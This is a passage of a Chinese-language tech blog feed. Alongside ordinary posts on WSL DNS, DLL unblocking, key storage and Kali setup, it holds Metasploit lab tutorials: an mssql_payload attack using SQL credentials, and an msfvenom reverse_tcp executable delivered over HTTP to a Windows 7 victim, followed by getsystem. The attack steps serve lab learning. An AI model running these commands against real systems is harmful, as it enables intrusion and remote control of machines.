    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天要將 VMDK 轉到 VHD 時，從網路下載 <a href="https://1drv.ms/u/s!Amctqf6I8YYKj_0kR_iru8F0-9CBGg?e=FJzCxA" target="_blank" rel="noopener">Microsoft Virtual Machine Converter 3.0</a> Zip 檔案。<br>下載解壓縮後，開啟 PowerShell 執行 <code>Import-Module</code> ，卻出現 <strong>Import-Module : Could not load file or assembly ‘file:///C:\Program Files\Microsoft Virtual Machine Converter\MvmcCmdlet.dll’ or one of its dependencies. Operation is not supported. (Exception from HRESULT: 0x80131515)</strong> 的錯誤。</p><h3 id="解決方式"><a href="#解決方式" class="headerlink" title="解決方式"></a>解決方式</h3><p>查看 C:\Program Files\Microsoft Virtual Machine Converter\MvmcCmdlet.dll 內容-&gt;一般，<br>最下面的屬性中，多了一個 <strong>安全性</strong> 的提示，選取 <strong>解除封鎖</strong> 並按下套用的 Button 後，<br>再下 Import-Module 就可以成功匯入了。</p><p>不過，看該目錄的其他 DLL 還是有被封鎖的問題，<br>所以最快的方式就是在 <strong>zip</strong> 檔案內容-&gt;一般，<br>最下面  <strong>安全性</strong> 的提示，選取 <strong>解除封鎖</strong> 並按下套用的 Button 後，<br>再解壓縮就可以了哦。<br><img src="/2022/07/05/ps-import-module-0x80131515/01.png" title="解除封鎖"></p><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://stackoverflow.com/questions/34400546/could-not-load-file-or-assembly-operation-is-not-supported-exception-from-hres" target="_blank" rel="noopener">Could not load file or assembly Operation is not supported. (Exception from HRESULT: 0x80131515)</a><br><a href="https://dotblogs.com.tw/rainmaker/2013/08/29/115826" target="_blank" rel="noopener">Exception from HRESULT: 0x80131515</a><br><a href="https://rainmakerho.github.io/2021/05/06/vmdk-to-vhd-azure/">將 VMDK (VHD) 移轉到 Azure</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;今天要將 VMDK 轉到 VHD 時，從網路下載 &lt;a href=&quot;https://1drv.ms/u/s!Amctqf6I8YYKj_0k
      
    
    </summary>
    
    
      <category term="zip" scheme="https://rainmakerho.github.io/tags/zip/"/>
    
      <category term="0x80131515" scheme="https://rainmakerho.github.io/tags/0x80131515/"/>
    
      <category term="Import-Module" scheme="https://rainmakerho.github.io/tags/Import-Module/"/>
    
      <category term="dll" scheme="https://rainmakerho.github.io/tags/dll/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit Framework - mssql_payload</title>
    <link href="https://rainmakerho.github.io/2022/07/05/metasploit-mssql-payload/"/>
    <id>https://rainmakerho.github.io/2022/07/05/metasploit-mssql-payload/</id>
    <published>2022-07-05T08:13:26.000Z</published>
    <updated>2022-07-05T09:09:00.134Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>如果知道某台 SQL Server 的帳/密，<br>可以很容易地透過 Metasploit Framework 的 mssql_payload 模組來測試 SQL Server. </p><h3 id="使用-windows-mssql-mssql-payload"><a href="#使用-windows-mssql-mssql-payload" class="headerlink" title="使用 windows/mssql/mssql_payload"></a>使用 windows/mssql/mssql_payload</h3><p><code>use windows/mssql/mssql_payload</code> 後，預設的 payload 是 <strong>windows/meterpreter/reverse_tcp</strong> (也可以透過 <code>show payloads</code> 來查看選擇要用那一項 payload)。<br>輸入 <code>show options</code> 來查看 Module 及 Payload 需要輸入那些參數，<br><img src="/2022/07/05/metasploit-mssql-payload/01.png" title="use mssql_payload"></p><p>設定要攻擊的 SQL Server ，帳/密 及透過 Payload 連回到 Client 的 IP 及 Port，<br>設定完成後，輸入 <code>run</code> 來進行測試。完整的指令如下，<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use windows/mssql/mssql_payload</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.5.0.4</span><br><span class="line"><span class="built_in">set</span> USERNAME [sqlAccountName]</span><br><span class="line"><span class="built_in">set</span> PASSWORD [sqlAccountPwd]</span><br><span class="line"><span class="built_in">set</span> LHOST [Server 連回來的電腦]</span><br><span class="line"><span class="built_in">set</span> LPORT [Server 連回來的Port]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p><p>註: RHOSTS 為 MSSQL 伺服器<br>註: USERNAME 為 MSSQL 伺服器的帳號<br>註: PASSWORD 為 MSSQL 登入者的密碼<br>註: LHOST 為 要讓 RHOSTS 連回來的 IP<br>註: 如果 SQL Server 的 xp_cmdshell 沒有啟用，會試著將它啟用。<br><img src="/2022/07/05/metasploit-mssql-payload/02.png" title="use mssql_payload"><br><img src="/2022/07/05/metasploit-mssql-payload/03.png" title="mssql_payload 完成"><br>成功的話，會建立並進入到 Meterpreter Session 1 。</p><p>在 <strong>meterpreter</strong> 就可以輸入 <code>sysinfo</code>，<code>getuid</code> 來取得這台機器的一些資訊<br><img src="/2022/07/05/metasploit-mssql-payload/04.png" title="mssql_payload meterpreter"></p><p>如果要暫時離開這個 session 可以輸入 <code>background</code> 或是輸入 Ctrl + Z<br>輸入 <code>sessions</code> 可以查看目前有多少個 session<br><img src="/2022/07/05/metasploit-mssql-payload/06.png" title="sessions CtrlZ"></p><img src="/2022/07/05/metasploit-mssql-payload/05.png" title="sessions background"><p>要進入某個 meterpreter session ，可以輸入 <code>session -i [session number]</code></p><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://www.offensive-security.com/metasploit-unleashed/payloads-mssql/" target="_blank" rel="noopener">PAYLOADS THROUGH MSSQL</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;如果知道某台 SQL Server 的帳/密，&lt;br&gt;可以很容易地透過 Metasploit Framework 的 mssql_paylo
      
    
    </summary>
    
    
      <category term="mssql" scheme="https://rainmakerho.github.io/tags/mssql/"/>
    
      <category term="metasploit" scheme="https://rainmakerho.github.io/tags/metasploit/"/>
    
      <category term="mssql_payload" scheme="https://rainmakerho.github.io/tags/mssql-payload/"/>
    
      <category term="xp_cmdshell" scheme="https://rainmakerho.github.io/tags/xp-cmdshell/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit Framework - TCP Port Scan</title>
    <link href="https://rainmakerho.github.io/2022/07/05/metasploit-portscan-tcp/"/>
    <id>https://rainmakerho.github.io/2022/07/05/metasploit-portscan-tcp/</id>
    <published>2022-07-05T01:17:29.000Z</published>
    <updated>2022-07-05T01:35:38.344Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>除了使用 nmap 外，metasploit 也可以進行 portscan ，<br>透過 <code>search portscan</code> 可以找到 metasploit 提供的那些 portscan 模組<br><img src="/2022/07/05/metasploit-portscan-tcp/01.png" title="search portscan"></p><h3 id="使用-scanner-portscan-tcp"><a href="#使用-scanner-portscan-tcp" class="headerlink" title="使用 scanner/portscan/tcp"></a>使用 scanner/portscan/tcp</h3><p>要使用模組時，可以使用 use [列表index/名稱] ，<br>例如 <code>use 5</code> or <code>use scanner/portscan/tcp</code> </p><p>選擇使用的模組後，可以輸入 <code>show options</code> 來查看需要輸入那些參數，<br>再透過 <code>set [參數名] [值]</code> 來設定參數，<br>Required 為 yes ，表示該參數一定要設定值。</p><p>設定完成後，輸入 <code>run</code> 來執行。完整的指令如下，<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search portscan</span><br><span class="line">use scanner/portscan/tcp</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.5.0.4</span><br><span class="line"><span class="built_in">set</span> THREADS 50</span><br><span class="line"><span class="built_in">set</span> PORTS 1-2000</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><ul><li>註: RHOSTS 是我們要掃的目標</li><li>註: PORTS 設定掃 1 ~ 2000 Port</li><li>註: 使用 50 個 Thread來執行</li><li>註: 如果要記住這些設定值，可輸入 <code>save</code> 將它們記錄在 DB 之中</li></ul><img src="/2022/07/05/metasploit-portscan-tcp/02.png" title="portscan">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;除了使用 nmap 外，metasploit 也可以進行 portscan ，&lt;br&gt;透過 &lt;code&gt;search portscan&lt;/c
      
    
    </summary>
    
    
      <category term="metasploit" scheme="https://rainmakerho.github.io/tags/metasploit/"/>
    
      <category term="portscan" scheme="https://rainmakerho.github.io/tags/portscan/"/>
    
      <category term="tcp" scheme="https://rainmakerho.github.io/tags/tcp/"/>
    
      <category term="scanner" scheme="https://rainmakerho.github.io/tags/scanner/"/>
    
      <category term="auxiliary" scheme="https://rainmakerho.github.io/tags/auxiliary/"/>
    
      <category term="scanner/portscan/tcp" scheme="https://rainmakerho.github.io/tags/scanner-portscan-tcp/"/>
    
  </entry>
  
  <entry>
    <title>收集 Domain 資訊的好網站 DNSdumpster.com</title>
    <link href="https://rainmakerho.github.io/2022/06/30/dns-dumpster/"/>
    <id>https://rainmakerho.github.io/2022/06/30/dns-dumpster/</id>
    <published>2022-06-30T05:25:51.000Z</published>
    <updated>2022-06-30T05:43:22.438Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>有時想要收集某個 Domain 對外有那些 伺服器等等資訊，<br>可以下一些指令來收集，利如用 nmap 掃 cidr ， dnsrecon 等等。<br>介紹大家使用 <a href="https://dnsdumpster.com/" target="_blank" rel="noopener">dnsdumpster.com</a> 就可以收集到蠻詳細的資訊及圖表。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>使用介面很簡單，只要輸入要查詢的 domain ，再按下 Search 即可，<br><img src="/2022/06/30/dns-dumpster/01.png" title="Search"></p><p>很快就會傳回相關的資訊列表及圖表，如下，<br><img src="/2022/06/30/dns-dumpster/02.png" title="Search Result"></p><p>也可以下載 Excel 檔案及圖表，<br><img src="/2022/06/30/dns-dumpster/03.png" title="Download Result"></p><p>針對測試者就可以查看這些資訊來決定要測試的範圍，<br>針對MIS人員，可以定期查看是否有非預期對外的伺服器顯示在外面。</p><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://www.linode.com/docs/guides/red-team-reconnaissance-techniques/" target="_blank" rel="noopener">Red Team Reconnaissance Techniques</a><br><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">dnsdumpster.com</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;有時想要收集某個 Domain 對外有那些 伺服器等等資訊，&lt;br&gt;可以下一些指令來收集，利如用 nmap 掃 cidr ， dnsreco
      
    
    </summary>
    
    
      <category term="Red Team" scheme="https://rainmakerho.github.io/tags/Red-Team/"/>
    
      <category term="Reconnaissance" scheme="https://rainmakerho.github.io/tags/Reconnaissance/"/>
    
      <category term="DNS records" scheme="https://rainmakerho.github.io/tags/DNS-records/"/>
    
      <category term="IP addresses" scheme="https://rainmakerho.github.io/tags/IP-addresses/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit Framework - 遠端控制 Windows 電腦</title>
    <link href="https://rainmakerho.github.io/2022/06/23/metasploit-reverse-tcp/"/>
    <id>https://rainmakerho.github.io/2022/06/23/metasploit-reverse-tcp/</id>
    <published>2022-06-23T03:21:33.000Z</published>
    <updated>2022-06-23T07:12:46.747Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Metasploit Framework 是一個功能強大的資安工具組，<br>它將許多工具以Module的方式整合在一起，<br>而不用到到處去找、去下載不同的工具來做滲透測試。<br>正式開始學習之前先來淺嘗一下 Metasploit Framework 的強大之處。<br>練習情境為受害者收到釣魚信去下載惡意檔案並執行，<br>導致受害者的電腦(Windows 7)受到控制。</p><h3 id="練習"><a href="#練習" class="headerlink" title="練習"></a>練習</h3><p>開始之前，先準備一台 Windows 7(ip為10.5.0.5) 為受害VM，Ubuntu(版本為 20.04.4, ip為10.5.0.7) 安裝 Metasploit Framework。</p><p>1.安裝 <strong>Metasploit Framework</strong><br>依 <a href="https://linuxways.net/ubuntu/how-to-install-metasploit-framework-on-ubuntu-20-04/" target="_blank" rel="noopener">How to Install Metasploit Framework on Ubuntu 20.04</a> 說明來安裝。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span><br><span class="line">sudo chmod 755 msfinstall</span><br><span class="line">sudo ./msfinstall</span><br><span class="line">sudo msfconsole</span><br><span class="line">db_status</span><br></pre></td></tr></table></figure></p><p>初始DB 及 設定 Web Service 的帳號及密碼 完成後，<br>執行 <code>db_status</code> 檢查 DB 是否有正常連線到 postgresql ([*] Connected to msf. Connection type: postgresql.)。<br>沒問題則執行 <code>exit</code> 離開 msfconsole</p><ul><li>註: 如果沒有設定 DB ，可以執行 <code>sudo msfdb init</code> 來設定 DB</li><li>註: 如果要重新設定 DB ，可以執行 <code>sudo msfdb reinit</code> 來重設 DB</li><li>註: 如果 postgresql 沒有啟動(postgresql selected, no connection)，可以執行 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br><span class="line">sudo service postgresql start</span><br><span class="line">sudo msfconsole</span><br><span class="line">db_status</span><br></pre></td></tr></table></figure></li></ul><p>2.建立 <strong>reverse_tcp</strong> 遠端控制執行檔<br>執行 <code>msfvenom</code> 來產生遠端控制執行檔，預設為 x86<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.5.0.7 -f exe -o ~/test.exe</span><br></pre></td></tr></table></figure></p><p>當使用者執行 <code>test.exe</code> 就會與 LHOST 建立連線</p><p>3.建立 <strong>http 網站</strong>來讓 Windows 7(ip為10.5.0.5) 下載<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure></p><p>4.Windows 7(ip為10.5.0.5) 下載 <strong>test.exe</strong><br>Windows 7(ip為10.5.0.5) 開啟 IE 下載 test.exe<br><img src="/2022/06/23/metasploit-reverse-tcp/01.png" title="開啟 IE 下載 test.exe"></p><p>5.開啟 <strong>msfconsole</strong> 並設定 LHOST 及 RHOST<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">setg LHOST 10.5.0.7</span><br><span class="line">setg RHOST 10.5.0.5</span><br><span class="line">save</span><br></pre></td></tr></table></figure></p><p>全域設定 LHOST 為 Ubuntu(ip為10.5.0.7)，RHOST 為 Windows 7(ip為10.5.0.5)，<br>所以使用各項 Module 時，預設會使用此設定</p><p>6.使用 <strong>exploit/multi/handler</strong> 模組來監聽<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure></p><p>7.payload 使用 <strong>windows/meterpreter/reverse_tcp</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></p><p>8.查看<strong>設定值</strong>是否完整<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></p><img src="/2022/06/23/metasploit-reverse-tcp/02.png" title="show options"><p>在 payload 設定值中 Required 為 true 的參數都已有設定值</p><p>9.啟動<strong>監聽</strong>，並執行 test.exe<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></p><p>並到 Windows 7 中執行 <code>test.exe</code><br><img src="/2022/06/23/metasploit-reverse-tcp/03.png" title="Meterpreter session opened"><br>這時，受害者電腦已與我們的Ubuntu 建立連線，<br>同時會進到了 meterpreter</p><p>10.執行 <code>getsystem</code> 來提升權限為 local administrator or SYSTEM<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure></p><img src="/2022/06/23/metasploit-reverse-tcp/04.png" title="getsystem"><p>11.執行 <code>?</code> 來查看在 meterpreter 可以執行那些指令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?</span><br></pre></td></tr></table></figure></p><img src="/2022/06/23/metasploit-reverse-tcp/05.png" title="meterpreter core commands"><p>12.執行 <code>ps</code> 來顯示 Windows 7 中執行的 Processes<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure></p><img src="/2022/06/23/metasploit-reverse-tcp/06.png" title="ps command"><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://linuxways.net/ubuntu/how-to-install-metasploit-framework-on-ubuntu-20-04/" target="_blank" rel="noopener">How to Install Metasploit Framework on Ubuntu 20.04</a><br><a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/windows/meterpreter/reverse_tcp.md" target="_blank" rel="noopener">windows/meterpreter/reverse_tcp</a><br><a href="https://docs.rapid7.com/metasploit/meterpreter-getsystem/" target="_blank" rel="noopener">Meterpreter getsystem</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Metasploit Framework 是一個功能強大的資安工具組，&lt;br&gt;它將許多工具以Module的方式整合在一起，&lt;br&gt;而不用到到
      
    
    </summary>
    
    
      <category term="資安" scheme="https://rainmakerho.github.io/tags/%E8%B3%87%E5%AE%89/"/>
    
      <category term="metasploit" scheme="https://rainmakerho.github.io/tags/metasploit/"/>
    
      <category term="reverse_tcp" scheme="https://rainmakerho.github.io/tags/reverse-tcp/"/>
    
      <category term="msfvenom" scheme="https://rainmakerho.github.io/tags/msfvenom/"/>
    
      <category term="exploit/multi/handler" scheme="https://rainmakerho.github.io/tags/exploit-multi-handler/"/>
    
      <category term="msfconsole" scheme="https://rainmakerho.github.io/tags/msfconsole/"/>
    
  </entry>
  
  <entry>
    <title>WSL Could not resolve host</title>
    <link href="https://rainmakerho.github.io/2022/06/21/wsl-could-not-resolve-host/"/>
    <id>https://rainmakerho.github.io/2022/06/21/wsl-could-not-resolve-host/</id>
    <published>2022-06-21T05:32:40.000Z</published>
    <updated>2022-06-21T05:51:06.529Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在 WSL 中透過 curl 取得網頁時，會發生 <strong>Could not resolve host</strong> 的錯誤，<br><strong>curl: (6) Could not resolve host: <a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></strong></p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>查看<a href="https://github.com/microsoft/WSL/issues/4275" target="_blank" rel="noopener">Can not connect to internet in WSL 2</a>，因為無法解析 <a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> ，<br>所以可以在 <strong>/etc/resolv.conf</strong> 加入 <strong>nameserver</strong>，<br>例如原本的內容為，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># generateResolvConf = false</span><br><span class="line">nameserver 172.25.240.1</span><br></pre></td></tr></table></figure></p><p>再加一項 nameserver 8.8.8.8 設定，如下，<br><code>sudo vi /etc/resolv.conf</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># generateResolvConf = false</span><br><span class="line">nameserver 8.8.8.8</span><br><span class="line">nameserver 172.25.240.1</span><br></pre></td></tr></table></figure><p>存檔後，就可以正常透過 curl 連了。</p><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://github.com/microsoft/WSL/issues/4275" target="_blank" rel="noopener">Can not connect to internet in WSL 2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在 WSL 中透過 curl 取得網頁時，會發生 &lt;strong&gt;Could not resolve host&lt;/strong&gt; 的錯誤，&lt;
      
    
    </summary>
    
    
      <category term="WSL" scheme="https://rainmakerho.github.io/tags/WSL/"/>
    
      <category term="Could not resolve host" scheme="https://rainmakerho.github.io/tags/Could-not-resolve-host/"/>
    
      <category term="curl" scheme="https://rainmakerho.github.io/tags/curl/"/>
    
      <category term="Windows Subsystem for Linux" scheme="https://rainmakerho.github.io/tags/Windows-Subsystem-for-Linux/"/>
    
  </entry>
  
  <entry>
    <title>加密/解密的 Key 要放在那裡?</title>
    <link href="https://rainmakerho.github.io/2022/06/21/save-key-options/"/>
    <id>https://rainmakerho.github.io/2022/06/21/save-key-options/</id>
    <published>2022-06-21T03:24:34.000Z</published>
    <updated>2022-06-21T03:41:17.250Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>我們會使用 Key 來做 <strong>加密</strong>及<strong>解密</strong>，<br>那這個 Key 常常會被放在程式碼之中，<br>而在 Code Review 中，也常常被拿出來討論。<br>以下就整理放 Key 的一些選項，</p><h3 id="Key存放選項"><a href="#Key存放選項" class="headerlink" title="Key存放選項"></a>Key存放選項</h3><ol><li>在 <strong>加密/解密</strong> 程式碼中，但如果程式碼被別人看到，加密就會被破解</li><li>透過 Windows 作業系統保護，.NET 可透過 <a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.protecteddata.protect?view=dotnet-plat-ext-6.0" target="_blank" rel="noopener">ProtectedData.Protect / ProtectedData.Unprotect</a> 來將 Key 再進行加密存到設定檔中，要使用時，再解密回來使用</li><li>放在地端的 Vault 之中，目前最常見的就是使用 <a href="https://www.vaultproject.io/" target="_blank" rel="noopener">HashiCorp Vault</a></li><li>放在雲端的 Vault 之中，例如 Azure Key Vault or <a href="https://www.vaultproject.io/" target="_blank" rel="noopener">HashiCorp Vault</a></li></ol><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.protecteddata.protect?view=dotnet-plat-ext-6.0" target="_blank" rel="noopener">ProtectedData.Protect / ProtectedData.Unprotect</a><br><a href="https://github.com/Azure/azure-sdk-for-net/blob/main/sdk/keyvault/Azure.Security.KeyVault.Secrets/samples/Sample3_GetSecrets.md" target="_blank" rel="noopener">Azure Key Vault Sample</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;我們會使用 Key 來做 &lt;strong&gt;加密&lt;/strong&gt;及&lt;strong&gt;解密&lt;/strong&gt;，&lt;br&gt;那這個 Key 常常會被放
      
    
    </summary>
    
    
      <category term="Encrypt" scheme="https://rainmakerho.github.io/tags/Encrypt/"/>
    
      <category term="Decrypt" scheme="https://rainmakerho.github.io/tags/Decrypt/"/>
    
      <category term="加密" scheme="https://rainmakerho.github.io/tags/%E5%8A%A0%E5%AF%86/"/>
    
      <category term="解密" scheme="https://rainmakerho.github.io/tags/%E8%A7%A3%E5%AF%86/"/>
    
      <category term="Key" scheme="https://rainmakerho.github.io/tags/Key/"/>
    
      <category term="ProtectedData" scheme="https://rainmakerho.github.io/tags/ProtectedData/"/>
    
      <category term="Vault" scheme="https://rainmakerho.github.io/tags/Vault/"/>
    
  </entry>
  
  <entry>
    <title>在 WSL2 中安裝 Kali Linux</title>
    <link href="https://rainmakerho.github.io/2022/06/15/kali-linux-win-wsl/"/>
    <id>https://rainmakerho.github.io/2022/06/15/kali-linux-win-wsl/</id>
    <published>2022-06-15T03:27:34.000Z</published>
    <updated>2022-06-15T03:34:51.730Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>以往使用 Kali Linux 大多是透過 VM 的方式來建立，<br>如果是 Windows 10/11 的話，也可以透過 Windows Subsystem for Linux(WSL) 來取得 Kali Linux。<br>如果需要 GUI 的畫面，則可以安裝 Win-KeX</p><h3 id="實作"><a href="#實作" class="headerlink" title="實作"></a>實作</h3><p>以系統管理員身份執行開啟 PowerShell ，並執行<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</span><br></pre></td></tr></table></figure></p><p>重新開機</p><p>以系統管理員身份執行開啟 PowerShell ，並執行<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br><span class="line">dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br></pre></td></tr></table></figure></p><p>重新開機</p><p>從<a href="https://aka.ms/wsl2kernel" target="_blank" rel="noopener">Linux 核心更新套件</a> 下載並安裝 WSL2 Linux 核心更新套件<br>以系統管理員身份執行開啟 PowerShell ，並執行<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --set-default-version <span class="number">2</span></span><br></pre></td></tr></table></figure></p><p>從 Microsoft Store 搜尋 Kali Linux ，並<strong>取得</strong>它<br><img src="/2022/06/15/kali-linux-win-wsl/01.png" title="Kali Linux"></p><p>開啟 <strong>Kali Linux</strong> App，登入後，執行以下指令來安裝 Win-KeX<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y kali-win-kex</span><br></pre></td></tr></table></figure></p><p>要開啟 Kali Linux GUI ，則輸入 kex<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kex</span><br></pre></td></tr></table></figure></p><img src="/2022/06/15/kali-linux-win-wsl/02.png" title="Kali Linux GUI"><p>如果覺得預設版本的 Kali 程式太少，則可以安裝較大版本的 Kail，執行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y kali-linux-large</span><br></pre></td></tr></table></figure></p><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://www.kali.org/docs/wsl/win-kex/" target="_blank" rel="noopener">Win-KeX</a><br><a href="https://docs.microsoft.com/zh-tw/windows/wslinstall-manual#step-4---download-the-linux-kernel-update-package" target="_blank" rel="noopener">下載 Linux 核心更新套件</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;以往使用 Kali Linux 大多是透過 VM 的方式來建立，&lt;br&gt;如果是 Windows 10/11 的話，也可以透過 Windows
      
    
    </summary>
    
    
      <category term="Windows" scheme="https://rainmakerho.github.io/tags/Windows/"/>
    
